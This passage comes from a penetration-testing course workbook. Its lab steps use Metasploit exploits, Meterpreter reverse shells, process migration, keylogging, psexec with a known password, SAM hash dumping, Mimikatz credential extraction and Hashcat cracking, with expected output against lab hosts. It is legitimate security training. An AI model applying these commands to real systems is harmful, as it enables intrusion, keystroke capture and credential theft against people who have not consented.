msf exploit(multi/misc/java\_jmx\_server) > setg AutoLoadExtensions stdapi,priv AutoLoadExtensions => stdapi,priv

msf exploit(multi/misc/java\_jmx\_server) > sessions -u 1

- [\*] Executing 'post/multi/manage/shell\_to\_meterpreter' on session(s): [1]
- [!] SESSION may not be compatible with this module:
- [!] \* missing Meterpreter features: stdapi\_railgun\_api, stdapi\_sys\_process\_kill
- [\*] Upgrading session ID: 1
- [\*] Starting exploit/multi/handler
- [\*] Started reverse TCP handler on 192.168.188.138:4433

msf exploit(multi/misc/java\_jmx\_server) >

- [\*] Sending stage (203846 bytes) to 192.168.188.139
- [\*] Meterpreter session 2 opened (192.168.188.138:4433 -> 192.168.188.139:50178) at 2025-09-17 18:33:34 +0000
- [\*] Stopping exploit/multi/handler

[\*] Starting interaction with 2...

If you see [\*] Stopping exploit/multi/handler and you're waiting for your prompt to return, press Enter .

Let's use the new session.

#### Command

sessions -i 2

#### Expected Results

msf exploit(multi/misc/java\_jmx\_server) > sessions -i 2

meterpreter >

Now, we will migrate Meterpreter from the java.exe process into an explorer.exe process. We use explorer.exe because it will generally remain running as long as the user is logged in.

To do this, we need the to get the current process ID for explorer.exe, which we can get with ps -S explorer.exe (capital S) to search for the process by name.

# Command ps -S explorer.exe Expected Results meterpreter > ps -S explorer.exe Filtering on 'explorer.exe' Process List ============ PID PPID Name Arch Session User Path --- ---- ---- ---- ------- ---- ---- 3348 9900 explorer.exe x64 1 SEC560-WINDOWS\sec560 C:\Windows\explorer.exe

We can jump to the explorer.exe process by process ID, or we can specify the name with the -N option.

Then, to jump into that process, we will use the migrate command. Here, we're using the -N option to migrate by process name, which is more convenient.

#### Are you running on Apple Silicon? (click to expand)

If you are running on Apple Silicon, the remainder of the lab will not work on your system. Meterpreter does not fully support ARM based processors, yet. What you have been able to do thus far was because of the cross-platform nature of Java Meterpreter, and a Windows feature called Prism that allows for x86/x64 emulation on ARM64. You can read more about Prism here. Fear not, later in the course, you'll have the change to use Meterpreter on Intel systems in the range environment. Those targets will support all of Meterpreter's features.

Please read through the remainder of the steps of the lab for familiarity. Be sure to follow the instructions in the "Cleaning Up" section at the end of the lab.

# Command migrate -N explorer.exe Expected Results meterpreter > migrate -N explorer.exe [\*] Migrating from 11560 to 3348... [\*] Migration completed successfully.

Migration may take several seconds to work. If it is successful, you'll see a message saying so.

#### If your migration fails (click to expand)

If your migration fails (and it is likely that it may) you can still use your first Meterpreter session and upgrade it again with sessions -u 1 .

#### Command

getpid

#### Expected Results

meterpreter > getpid Current pid: XXXX

It should be the number associated with explorer.exe. If so, you just hopped between processes. Migration can be buggy. If the target process crashes, that's okay. You can upgrade your Java Meterpreter session on the target system again by exiting your dead Meterpreter session with a CTRL-C or exit command. Then run sessions -u 1 again.

#### *9: Keystroke Logging*

A common way to demonstrate keystroke logging is to use Notepad. Your Windows VM doesn't have Notepad, so we'll use VS Code. Double click on the VS Code shortcut on your Windows VM Desktop.

![](SEC560_WorkBook1_page_195_Picture_10.jpeg)

Return to your Linux VM and meterpreter session and run the command keyscan\_start .

# Command keyscan\_start Expected Results meterpreter > keyscan\_start Starting the keystroke sniffer ...

Then, in Windows, type some text into VS Code. Type a note about your password, such as my password is Re@llyL0ngP@ssw0rd!.

Now go back to the Meterpreter and dump the captured keystrokes to the screen.

# Command keyscan\_dump Expected Results meterpreter > keyscan\_dump Dumping captured keystrokes... my password is <Right Shift>Re<Right Shift>@lly<Shift>L0ng<Right Shift>P@ssw0rd<Right Shift>!

Then stop the keystroke logger:

# Command keyscan\_stop Expected Results meterpreter > keyscan\_stop Stopping the keystroke sniffer... meterpreter >

You can now close VS Code. We're aren't going to write code in the course.

#### *10: Cleaning Up*

To clean up, close your meterpreter session by either enter exit at the meterpreter > prompt, or enter sessions -K at the msf > prompt. Then exit Metasploit completely with the exit command.

#### Expected Results

meterpreter > exit

[\*] Shutting down session: 2

[\*] 192.168.188.139 - Meterpreter session 1 closed. Reason: User exit msf exploit(multi/misc/java\_jmx\_server) > sessions -K

[\*] Killing all sessions...

[\*] 192.168.188.139 - Meterpreter session cassandra\_win11 closed. msf exploit(multi/misc/java\_jmx\_server) > exit

sec560@560vm:~\$

Then switch to your Windows VM and stop the Cassanda service. To stop Cassandra, press ctrl + c . When asked if you want to "Terminate bath job (Y/N)?" type y and press enter.

#### Abstract

INFO 00:10:05 Stop listening to thrift clients

INFO 00:10:05 Stop listening for CQL clients

INFO 00:10:05 Announcing shutdown

INFO 00:10:07 Waiting for messaging service to quiesce

INFO 00:10:07 MessagingService has terminated the accept() thread

Terminate batch job (Y/N)? y

PS C:\Users\sec560>

#### Conclusion

In this lab, we saw a service-side exploit in use against a vulnerable listening service. By exploiting that flaw using Metasploit, we were able to load a Meterpreter payload with a reverse\_http stager into the target machine's memory. We then explored numerous features of the Meterpreter, including its ability to explore the file system, run programs (such as a shell ), provide channels of communication between a program's Standard Input and Standard Output, take screenshots, migrate processes, and log keystrokes. Truly, the Meterpreter is a very powerful payload component in the penetration tester's arsenal.

## *Lab 3.1: MSF psexec, hashdump, and Mimikatz*

#### Requires VPN Connection

You must have an active OpenVPN connection using the sec560-labs-range.ovpn file from https://connect.labs.sans.org to complete this exercise.

#### Objectives

- To use the Metasploit psexec exploit module to deploy a Meterpreter payload to a target Windows machine using an authenticated SMB session •
- To explore the Meterpreter's abilities to get privileges and dump hashes from a target machine •

#### Lab Setup

VMs used:

Linux •

You should be able to ping 10.130.10.5 from the Linux VM:

ping -c 4 10 .130.10.5

#### Expected Results

```
sec560@560vm:~$ ping -c 4 10 .130.10.5
PING 10.130.10.5 (10.130.10.5) 56(84) bytes of data.
64 bytes from 10.130.10.5: icmp_seq=1 ttl=127 time=27.0 ms
64 bytes from 10.130.10.5: icmp_seq=2 ttl=127 time=26.5 ms
64 bytes from 10.130.10.5: icmp_seq=3 ttl=127 time=27.0 ms
64 bytes from 10.130.10.5: icmp_seq=4 ttl=127 time=26.2 ms
```

--- 10.130.10.5 ping statistics ---

4 packets transmitted, 4 received, 0% packet loss, time 3001ms rtt min/avg/max/mdev = 26.212/26.676/27.036/0.344 ms

#### Lab – Step-by-Step Instructions

#### *1: Look for Admin Rights*

There are 2 requirements to use the exploit/windows/smb/psexec module against remote Windows systems:

- 1. We need an account with administrative access on the target.
- 2. The target system needs to be listening on SMB port, TCP 445.

In Lab 2.2: Password Guessing, we used Nmap to identify all the systems listening on TCP 445 and saved them to 445.tcp for use with other tools. We then used Hydra to find several valid accounts including hiboxy\bgreen:Password1. Any of those valid accounts could have admin access to other systems in the environment.

If you still have the 445.tcp file, you can use that. If not, let's run Nmap again to identify systems listening on TCP 445.

```
Command
 nmap -n -PS445 -p 445 --open 10.130.10.0/24 -oG - | awk'/Up/ { print $2 }' | tee 445.tcp
 Expected Results
   sec560@560vm:~$ nmap -n -PS445 -p 445 --open 10.130.10.0/24 -oG - | awk'/Up/ { print $2 }' |
   tee 445.tcp
   10.130.10.4
   10.130.10.5
   10.130.10.7
   10.130.10.21
   10.130.10.23
   10.130.10.25
   10.130.10.44
```

If you use an existing 445.tcp file, you should run cat 445.tcp and ensure the content matches the results above. If it does not, run the Nmap command above.

Using the list of systems in 445.tcp , we'll use NetExec and attempt to authenticate to each system.

We only care about the systems where bgreen is an admin. When NetExec authenticates to an SMB target, it checks if the authenticating user has access to the C\$ share. By default, only administrators do. When the user has access, NetExec marks the host with Pwn3d! in the output, which is extremely helpful!

NetExec assumes you have a *very* wide terminal and includes numerous spaces between fields. We'll use tr -s [:space:] to "squeeze" repeat spaces into a single space, which makes the output easier to read by eliminating dead space and line wraps. Then we'll grep for Pwn3d! to trim the results to only hosts where bgreen is an administrator.

```
nxc smb 445.tcp -u bgreen -p Password1 | tr -s [ :space:] | grep 'Pwn3d!'
```

#### Expected Results

```
sec560@560vm:~$ nxc smb 445.tcp -u bgreen -p Password1 | tr -s [ :space:] | grep 'Pwn3d!'
SMB 10.130.10.5 445 WEB01 [+] hiboxy.com\bgreen:Password1 (Pwn3d!)
SMB 10.130.10.25 445 MAIL01 [+] hiboxy.com\bgreen:Password1 (Pwn3d!)
SMB 10.130.10.44 445 FILE01 [+] hiboxy.com\bgreen:Password1 (Pwn3d!)
```

The order of your output may differ, but the list should be the same.

Great! In the results, we see bgreen is an admin on 10.130.10.5, 10.130.10.25, and 10.130.10.44. Let's use that in the attack!

#### *2: Metasploit &* exploit/windows/smb/psexec

Now, we're going to use one of the most useful and reliable modules in the Metasploit framework, the psexec module.

- msfconsole -q Launch msfconsole without showing banners. •
- -x Immediately runs a command or commands in msfconsole as soon as it launches. This replaced the deprecated msfcli command. Multiple commands can be stacked by separating them with a ; . •
- "use exploit/windows/smb/psexec; ..." The text between the double quotes is the command msfconsole will run at launch. We can put all of the commands on the same line, but for learning purposes and readability, we'll put them on individual lines. This works because Bash won't execute the commands until we close the double quotes. •

#### Command msfconsole -q -x " use exploit/windows/smb/psexec; set RHOST 10.130.10.5; set LHOST tun0; set SMBUser bgreen; set SMBDomain hiboxy; set SMBPass Password1 " Expected Results sec560@560vm:~\$ msfconsole -q -x " use exploit/windows/smb/psexec; set RHOST 10.130.10.5; set LHOST tun0; set SMBUser bgreen; set SMBDomain hiboxy; set SMBPass Password1 " [\*] No payload configured, defaulting to windows/meterpreter/reverse\_tcp [\*] New in Metasploit 6.4 - This module can target a SESSION or an RHOST RHOST => 10.130.10.5 LHOST => tun0 SMBUser => bgreen SMBDomain => hiboxy SMBPass => Password1 msf exploit(windows/smb/psexec) >

Let's look at one more thing before we launch the exploit. As we have seen, show options shows the main settings for Metasploit modules. But there are dozens of additional variables for most modules available via their advanced settings. We can see these options by running show advanced. Let's try it.

#### Command show advanced Expected Results msf exploit(windows/smb/psexec) > show advanced Module advanced options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- ALLOW\_GUEST false yes Keep trying if only given guest access CHOST no The local client address CMD::DELAY 3 no A delay (in seconds) before reading the command output and cleaning up CPORT no The local client port ...truncated for brevity... SERVICE\_FILENAME no Filename to to be used on target for the service binary SERVICE\_PERSIST false yes Create an Auto run service and do not remove it. SERVICE\_STUB\_ENCODER no Encoder to use around the service registering stub SMB::AlwaysEncrypt true yes Enforces encryption even if the server does not re ...truncated for brevity... Payload advanced options (windows/meterpreter/reverse\_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- AutoLoadExtensions unhook,priv,stdapi yes Automatically load extensions on bootstrap, comma separated. AutoLoadStdapi true yes Automatically load the Stdapi extension AutoRunScript no A script to run automatically on session creation. AutoSystemInfo true yes Automatically capture system information on initialization. AutoUnhookProcess false yes Automatically load the unhook extension and unhook the process AutoVerifySessionTimeout 30 no Timeout period to wait for session validation to occur, in seconds EnableStageEncoding false no Encode the second stage payload ...truncated for brevity...

Here we can see numerous options letting us specify things like the local client port ( CPORT) to use in launching an attack, an indication of whether or not to make a persistent service that will run every time the system boots so we'd automatically get a Meterpreter session sent back at system boot ( SERVICE\_PERSIST), and a setting of SERVICE\_FILENAME. This variable can be set to a name that the payload file will be written into on the target machine so that the service can execute it. Again, by default, the SERVICE\_FILENAME is a pseudorandom string. To be subtle, we may want to change that to something that is more likely to be expected on a target machine, such as svchost .

We'll leave these alone for now. The pseudorandom strings and the timing means that it is highly unlikely two services with the same name will be installed at the same time.

Before we launch the attack, let's confirm the settings are correct by running show options. Below are the options for the exploit.

| Command      |  |  |  |
|--------------|--|--|--|
| show options |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |
|              |  |  |  |

### Expected Results msf exploit(windows/smb/psexec) > show options Module options (exploit/windows/smb/psexec): Name Current Setting Required Description ---- --------------- -------- ----------- SERVICE\_DESCRIPTION no Service description to be used on target for pretty listing SERVICE\_DISPLAY\_NAME no The service display name SERVICE\_NAME no The service name SMBSHARE no The share to connect to, can be an admin share (ADMIN\$,C\$,...) or a normal read/writ e folder share Used when connecting via an existing SESSION: Name Current Setting Required Description ---- --------------- -------- ----------- SESSION no The session to run this module on Used when making a new connection via RHOSTS: Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS 10.130.10.5 no The target host(s), see https://docs.metasploit.com/ docs/using-metasploit/basics/using-metasplo it.html RPORT 445 no The target port (TCP) SMBDomain hiboxy no The Windows domain to use for authentication SMBPass Password1 no The password for the specified username SMBUser bgreen no The username to authenticate as Payload options (windows/meterpreter/reverse\_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC thread yes Exit technique (Accepted: '', seh, thread, process, none) LHOST tun0 yes The listen address (an interface may be specified) LPORT 4444 yes The listen port Exploit target: Id Name -- ---- 0 Automatic

View the full module info with the info, or info -d command.

#### *3: Launch the Attack*

In your Metasploit console terminal, let's launch the attack. In Lab 2.5 - Metasploit and Meterpreter , we used exploit to launch the exploit. We can also use run , as we will here:

#### Command

run

#### Expected Results

msf exploit(windows/smb/psexec) > run

[\*] Started reverse TCP handler on 10.254.252.6:4444

[\*] 10.130.10.5:445 - Connecting to the server...

[\*] 10.130.10.5:445 - Authenticating to 10.130.10.5:445|hiboxy as user 'bgreen'...

[\*] 10.130.10.5:445 - Selecting PowerShell target

[\*] 10.130.10.5:445 - Executing the payload...

[+] 10.130.10.5:445 - Service start timed out, OK if running a command or non-service executable...

[\*] Sending stage (177734 bytes) to 10.130.10.5

[\*] Meterpreter session 1 opened (10.254.252.6:4444 -> 10.130.10.5:60465) at 2025-09-18 20:04:49 +0000

meterpreter >

You should now see the meterpreter > prompt.

Note the output displayed on the screen. We can see the following actions taken by Metasploit:

- Metasploit automatically starts a reverse handler listening on local port 4444, awaiting the reverse\_tcp connection to come back. The default LPORT is 4444 for most Metasploit payloads. We could have changed that by setting the LPORT to some other value. 1.
- It then connects to the target server. 2.
- It authenticates to the target machine as user bgreen. 3.
- It then recognizes that the target has PowerShell installed. 4.
- It then executes the payload by starting the service. 5.
- If the service starts successfully, it then sends the stage to the target (uploading it using the stager). This is the small piece of shellcode that phones home to our con figured LHOST and LPORT to download the full Meterpreter payload. 6.
- And finally, if the stager phones home successfully, we load the full payload (sometimes called a "stage"), in this case a Meterpreter session. 7.

Now we are inside our Meterpreter session. To see the user account we are running as, let's run getuid .

![](SEC560_WorkBook1_page_208_Figure_1.jpeg)

We have local SYSTEM privileges on the machine. So we started with an admin user (bgreen) and used the credentials to get code execution as local SYSTEM via psexec.

Now, with your Meterpreter session, let's grab the hashes from the target. We'll use the post/windows/gather/smart\_hashdump module to extract password hashes from the remote system. This module is smart and will dump password hashes differently depending on the target system's role. If the target is a domain controller, it will pull passwords differently and from a different location. We'll discuss this in more depth later in this course.

Look at the smart\_hashdump module using the info command.

info post/windows/gather/smart\_hashdump

#### Expected Results

meterpreter > info post/windows/gather/smart\_hashdump

Name: Windows Gather Local and Domain Controller Account Password Hashes

Module: post/windows/gather/smart\_hashdump

Platform: Windows

Arch:

Rank: Normal

Provided by:

Carlos Perez <carlos\_perez@darkoperator.com>

Module stability:

crash-safe

Compatible session types:

Meterpreter

Basic options:

Name Current Setting Required Description

---- --------------- -------- -----------

GETSYSTEM false no Attempt to get SYSTEM privilege on the target host.

SESSION yes The session to run this module on

#### Description:

This will dump local accounts from the SAM Database. If the target host is a Domain Controller, it will dump the Domain Account Database using the proper technique depending on privilege level, OS and role of the host.

Module options (post/windows/gather/smart\_hashdump):

Name Current Setting Required Description

 ---- --------------- -------- ----------- GETSYSTEM false no Attempt to get SYSTEM privilege on the target host.

SESSION yes The session to run this module on

Execute the smart\_hashdump module.

run post/windows/gather/smart\_hashdump

#### Expected Results

meterpreter > run post/windows/gather/smart\_hashdump

- [\*] Running module against WEB01 (10.130.10.5)
- [\*] Hashes will be saved to the database if one is connected.
- [+] Hashes will be saved in loot in JtR password file format to:
- [\*] /home/sec560/.msf4/loot/20250918201412\_default\_10.130.10.5\_windows.hashes\_163308.txt
- [\*] Dumping password hashes...
- [\*] Running as SYSTEM extracting hashes from registry
- [\*] Obtaining the boot key...
- [\*] Calculating the hboot key using SYSKEY 2e44438ff5e532f0e2f7eac854bb1308...
- [\*] Obtaining the user list and keys...
- [\*] Decrypting user keys...
- [\*] Dumping password hints...
- [\*] No users with password hints on this system
- [\*] Dumping password hashes...
- [+] Administrator:500:aad3b435b51404eeaad3b435b51404ee:
- 31d6cfe0d16ae931b73c59d7e0c089c0:::
- [+] DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:
- 31d6cfe0d16ae931b73c59d7e0c089c0:::
- [+] WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:
- 31d6cfe0d16ae931b73c59d7e0c089c0:::
- [+] SROCAdmin:1000:aad3b435b51404eeaad3b435b51404ee:
- 31d6cfe0d16ae931b73c59d7e0c089c0:::
- [+] antivirus:1001:aad3b435b51404eeaad3b435b51404ee:
- 31d6cfe0d16ae931b73c59d7e0c089c0:::
- [+] slopez:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ...trimmed for brevity...

#### meterpreter >

The run post/windows/gather/smart\_hashdump command attempts to pull password hints from the system if any users have configured their accounts with password hints.

However, notice that all the NT hashes (the second part) are 31d6cfe0d16ae931b73c59d7e0c089c0 . This is a null NT hash. This module isn't going to work here, but it will work on a Domain Controller. Let's now try a different module.

Run the post/windows/gather/hashdump module.

run post/windows/gather/hashdump

#### This command may take a minute

It may take several minutes (as in 60-120 full clock seconds) to get the password hashes.

#### Expected Results

meterpreter > run post/windows/gather/hashdump

- [\*] Obtaining the boot key...
- [\*] Calculating the hboot key using SYSKEY 2e44438ff5e532f0e2f7eac854bb1308...
- [\*] Obtaining the user list and keys...
- [\*] Decrypting user keys...
- [\*] Dumping password hints...

No users with password hints on this system

[\*] Dumping password hashes...

Administrator:500:aad3b435b51404eeaad3b435b51404ee:3e310e619beefaaab21651628f8cde6e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:d7da45674bae3a0476c0f64b67121f7d::: SROCAdmin:1000:aad3b435b51404eeaad3b435b51404ee:2e920723943f81ec0af0fd735f737fef::: antivirus:1001:aad3b435b51404eeaad3b435b51404ee:47f0ca5913c6e70090d7b686afb9e13e::: slopez:1002:aad3b435b51404eeaad3b435b51404ee:87e968ead530264915a4b295c57c37d5::: ...trimmed for brevity...

So we successfully got hashes from the target machine, which we could then crack or use them in a *pass-the-hash attack*, we'll be covering both in depth later.

#### *4: Running Mimikatz*

We'll now extract credentials from the WEB01 computer (10.130.10.5) from memory using Mimikatz.

Let's take a look at our current session by running sysinfo .

# Command sysinfo Expected Results meterpreter > sysinfo Computer : WEB01 OS : Windows Server 2022 (10.0 Build 20348). Architecture : x64 System Language : en\_US Domain : HIBOXY Logged On Users : 8 Meterpreter : x86/windows

As we can see above, the target server is 64-bit (Windows Server has been exclusively 64-bit ever since Server 2008), but the Meterpreter process itself is 32-bit. To access the native memory view of a 64-bit machine, we need to be in a 64-bit process.

Let's find a 64-bit SYSTEM processes on the target using the ps command. We need to search for 64-bit processes ( -A x64 ) that are running with SYSTEM-level permissions (-s , lowercase s).

ps -A x64 -s

#### Expected Results

meterpreter > ps -A x64 -s Filtering on arch 'x64 Filtering on SYSTEM processes...

Process List ============

| PID PPID Name |                      | Arch Session User | Path                                                 |
|---------------|----------------------|-------------------|------------------------------------------------------|
|               |                      |                   |                                                      |
|               | 504 768 svchost.exe  | x64 0             | NT AUTHORITY\SYSTEM C:\Windows\System32\svchost.exe  |
|               | 696 616 winlogon.exe | x64 1             | NT AUTHORITY\SYSTEM C:\Windows\System32\winlogon.exe |
|               | 788 624 lsass.exe    | x64 0             | NT AUTHORITY\SYSTEM C:\Windows\System32\lsass.exe    |
|               | 892 768 svchost.exe  | x64 0             | NT AUTHORITY\SYSTEM C:\Windows\System32\svchost.exe  |
|               | 1056 768 svchost.exe | x64 0             | NT AUTHORITY\SYSTEM C:\Windows\System32\svchost.exe  |
|               | 1240 696 LogonUI.exe | x64 1             | NT AUTHORITY\SYSTEM C:\Windows\System32\LogonUI.exe  |
|               | 1284 892 dllhost.exe | x64 0             | NT AUTHORITY\SYSTEM C:\Windows\System32\dllhost.exe  |
|               | 1424 768 svchost.exe | x64 0             | NT AUTHORITY\SYSTEM C:\Windows\System32\svchost.exe  |
|               | 1604 768 svchost.exe | x64 0             | NT AUTHORITY\SYSTEM C:\Windows\System32\svchost.exe  |
|               | trimmed for brevity  |                   |                                                      |

#### Process ID will differ

The process IDs shown above will be different than what you see on your system.

As you can see in the above output, there will be a number of 64-bit SYSTEM processes. We need to identify a process to migrate to.

#### Process Migration

When migrating, do not migrate into any of the processes named svchost.exe. In the real world, when selecting a process to migrate into, think of the processes that will be less likely to have a signi ficant impact to the system if the process were to crash. A common choice is spoolsv (Print Spooler), since it isn't needed on most systems.

We'll then migrate into one of the 64-bit SYSTEM processes (spoolsv.exe ) using the following command:

![](SEC560_WorkBook1_page_214_Figure_0.jpeg)

Verify that your Meterpreter is 64-bit by running the command below and analyzing the Meterpreter line. The Meterpreter line should now say x64.

![](SEC560_WorkBook1_page_214_Figure_2.jpeg)

Now that we are in a 64-bit process, we can load Mimikatz with the following command:

# Your output should look similar to this: Command load kiwi Expected Results meterpreter > load kiwi Loading extension kiwi... .#####. mimikatz 2.2.0 20191125 (x64/windows) .## ^ ##. "A La Vie, A L'Amour" - (oe.eo) ## / \ ## /\*\*\* Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) ## \ / ## > http://blog.gentilkiwi.com/mimikatz '## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com ) '#####' > http://pingcastle.com / http://mysmartlogon.com \*\*\*/ Success.

Let's look at the new commands available to us by running help :

meterpreter >

help

Your output should look similar to this:

#### Expected Results

meterpreter > help

Core Commands =============

Command Description

 ------- ----------- ? Help menu

background Backgrounds the current session

bg Alias for background

bgkill Kills a background meterpreter script

...trimmed for brevity...

Kiwi Commands =============

Command Description

------- -----------

#### creds\_all Retrieve all credentials (parsed)

creds\_kerberos Retrieve Kerberos creds (parsed)

creds\_msv Retrieve LM/NTLM creds (parsed)

creds\_ssp Retrieve SSP creds

 creds\_tspkg Retrieve TsPkg creds (parsed) creds\_wdigest Retrieve WDigest creds (parsed)

 dcsync Retrieve user account information via DCSync (unparsed) dcsync\_ntlm Retrieve user account NTLM hash, SID and RID via DCSync

 golden\_ticket\_create Create a golden kerberos ticket kerberos\_ticket\_list List all kerberos tickets (unparsed) kerberos\_ticket\_purge Purge any in-use kerberos tickets

kerberos\_ticket\_use Use a kerberos ticket

kiwi\_cmd Execute an arbitrary mimikatz command (unparsed)

 lsa\_dump\_sam Dump LSA SAM (unparsed) lsa\_dump\_secrets Dump LSA secrets (unparsed) password\_change Change the password/hash of a user wifi\_list List wifi profiles/creds for the current user

wifi\_list\_shared List shared wifi profiles/creds (requires SYSTEM)

For more info on a specific command, use <command> -h or help <command>.

Now let's get the passwords from RAM by running the following command:

### You should see output similar to this: Command creds\_all Expected Results meterpreter > creds\_all [+] Running as SYSTEM [\*] Retrieving all credentials msv credentials =============== Username Domain NTLM SHA1 DPAPI -------- ------ ---- ---- ----- WEB01\$ HIBOXY e0cb8e04d67f1ec868a551a3e8b3fcbd 07bbd738f0fdd24fdae448014cf648beac344c8b 07bbd738f0fdd24fdae448014cf648be wdigest credentials =================== Username Domain Password -------- ------ -------- (null) (null) (null) WEB01\$ HIBOXY (null) kerberos credentials ==================== Username Domain Password -------- ------ -------- (null) (null) (null) WEB01\$ hiboxy.com ^Y!\uekv)?E! yW10K#PoKiEZ9JE;&?(77DjQ=r+ax(-?9 UL"mkL3#VbaVqy<kLZuu&0%izsq6;.oKDI>ijfGTUdfDED<:W!!KC\cM!=R9x?uvZ8o9RzYu8 web01\$ HIBOXY.COM (null)

While no interactive user account is currently logged on, we do see the credentials for the WEB01 computer account itself, including its NT hash (e0cb8e04d67f1ec868a551a3e8b3fcbd) and its actual plain text password (beginning with ^Y!\uekv in this example). Your hash and password will differ, as machine account passwords are randomly-generated and 120 characters long.

### If you see other users...

This just means someone has logged on interactively to that system and you were able to steal their credentials!

#### *5: Wrapping up*

To finish this lab, exit your Meterpreter session and Metasploit console:

| Command      |  |  |  |
|--------------|--|--|--|
| exit<br>exit |  |  |  |
|              |  |  |  |

#### Conclusion

In this lab, we've run the Metasploit psexec module, looking at its configuration options and analyzing its step-by-step activities to gain code execution on a target machine. We used psexec to run a meterpreter/reverse\_tcp payload on the target with local SYSTEM privileges, which we then employed to seize additional privileges and to gather hashes via the post/windows/gather/ hashdump module. Additionally, we can gather cleartext credentials for logged-in users with Mimikatz (kiwi). Each of these capabilities is highly useful in a penetration test.

## *Lab 3.2: Cracking Passwords with Hashcat*

| No VPN Required |
|-----------------|
|-----------------|

This exercise does not require an OpenVPN connection. Internet access is required.

#### Objectives

- To use Hashcat to crack password hashes from Windows and Linux systems •
- To analyze how Hashcat rules files can help crack hashes more successfully •

#### Lab Setup

VM used:

Linux •

In case you've run this lab before, let's perform a bit of clean up. Let's delete the pot files for JtR and Hashcat.

rm ~/.local/share/hashcat/hashcat.potfile

This command has no output. If the files have been cleaned up, you will receive an error. That error is OK.

#### Lab – Step-by-Step Instructions

#### *1: Hashcat Basics*

Let's invoke Hashcat with the --help option so that we can see the built-in documentation of Hashcat. Because it is quite voluminous, let's pipe it through less to paginate it:

#### Command

hashcat --help | less

Page through Hashcat's command line flags—there are a HUGE number of options here. In this lab, we'll explore some of the most useful.

In the output, we can see that Hashcat requires a -m followed by a *hash-type*, which is a number that selects from the over 275 types of hashes we can crack. We'll explore some specific hash types soon. But before we look at that, let's consider the -a option for *attack mode*, meaning how/whether Hashcat will use its dictionary. The -a option supports the following values:

- 0 : *Straight*. This mode uses the dictionary words as they appear in their dictionary, with rules applied to them as specified by the -r option (if present). Examples: letmein and password •
- 1 : *Combination*. This mode will take each word in the dictionary and append it to each word in the dictionary, essentially squaring the number of potential passwords from a word file. It will also apply the rules indicated by the -r option (if present) to the resulting combined words. Examples: letmeinpassword and passwordletmein •
- 3 : *Brute-Force*. This mode tries all potential passwords in a given keyspace, iterating through all characters. Examples: 0000, 0001, 0002, etc. •
- 6 : *Hybrid Wordlist + Mask*. This mode uses a dictionary but then appends a brute force component. Examples: letmein0000, password0000, letmein0001, etc. •

Press q to exit less . For our work in this lab, we'll use -a 0 as the most straightforward and common form of attack. Later in the lab, we'll use the -r option to specify rules that will do word mangling against the dictionary, while still applying our attack type 0 .

Next, let's search for the specific numbers associated with given hash types so that we can indicate which ones to use with the -m option. We can simply pipe the output of Hashcat's help through grep to look for some common hash types. The latest builds of Hashcat have moved the hash types to -hh instead of putting everything into --help . Let's start with looking for *LANMAN* hashes, abbreviated as *LM* by Hashcat:

```
Command
 hashcat --help | grep "Hash Modes"
 hashcat -hh | grep LM
 Expected Results
  sec560@560vm:~$ hashcat --help | grep "Hash Modes"
  - [ Hash Modes ] -
  please use -hh to show all supported Hash Modes
  sec560@560vm:~$ hashcat -hh | grep LM
  - [ Hash Modes ] -
   5500 | NetNTLMv1 / NetNTLMv1+ESS | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT) | Network Protocol
   5600 | NetNTLMv2 | Network Protocol
  27100 | NetNTLMv2 (NT) | Network Protocol
   3000 | LM | Operating System
   1000 | NTLM | Operating System
  25500 | Stargazer Stellar Wallet XLM | Cryptocurrency Wallet
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ [A-Z]
```

In your output, you should see a line that says 3000 | LM... This indicates that to crack LM hashes, we invoke Hashcat with -m 3000. We can also see the numbers that Hashcat associates with NTLMv1 and NTLMv2 in its output here as well because each matches the LM that we grepped for.

To determine the hash type number needed to crack salted MD5 Linux hashes (also known as md5crypt), please run:

![](SEC560_WorkBook1_page_221_Figure_3.jpeg)

Here we see that we should invoke Hashcat with -m 500 to crack these hashes, which are associated with *"Operating Systems"*.

Finally, let's look for how to specify *SHA512* hashes.

hashcat -hh | grep sha512

#### Expected Results

sec560@560vm:~\$ hashcat -hh | grep sha512 1770 | sha512(utf16le(\$pass)) | Raw Hash 1710 | sha512(\$pass.\$salt) | Raw Hash salted and/ or iterated 1720 | sha512(\$salt.\$pass) | Raw Hash salted and/ or iterated 1740 | sha512(\$salt.utf16le(\$pass)) | Raw Hash salted and/ or iterated 32410 | sha512(sha512(\$pass).\$salt) | Raw Hash salted and/ or iterated 32420 | sha512(sha512\_bin(\$pass).\$salt) | Raw Hash salted and/ or iterated 1730 | sha512(utf16le(\$pass).\$salt) | Raw Hash salted and/ or iterated 28400 | bcrypt(sha512(\$pass)) | Generic KDF 6500 | AIX {ssha512} | Operating System 1800 | sha512crypt \$6\$, SHA512 (Unix) | Operating System 21600 | Web2py pbkdf2-sha512 | Framework 20200 | Python passlib pbkdf2-sha512 | Framework 21000 | BitShares v0.x - sha512(sha512\_bin(pass)) | Cryptocurrency Wallet

We can see that for *SHA512* passwords within operating systems, Hashcat uses -m 1800.

Let's now do some performance benchmarking, starting with -m 3000, which is for *LM* hashes. Note that we'll invoke Hashcat with the -w 3 flag, meaning that we want a Workload Profile ( -w ) number 3. The various options for -w include:

